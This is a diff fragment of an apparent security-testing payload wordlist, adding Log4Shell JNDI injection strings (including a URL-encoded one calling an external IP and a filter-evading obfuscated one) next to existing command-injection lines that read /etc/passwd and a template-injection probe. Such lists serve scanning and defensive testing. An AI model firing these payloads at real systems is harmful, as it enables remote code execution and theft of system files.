@@ -929,3 +929,6 @@ x\\|
 |cat$IFS/etc/passwd $(cat$IFS/etc/passwd)`cat$IFS/etc/passwd`;cat$IFS/etc/passwd;
 %27%22%25%32%37%25%32%32
 {{1330+7}}
+${jndi:ldap://127.0.0.1}
+$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1}
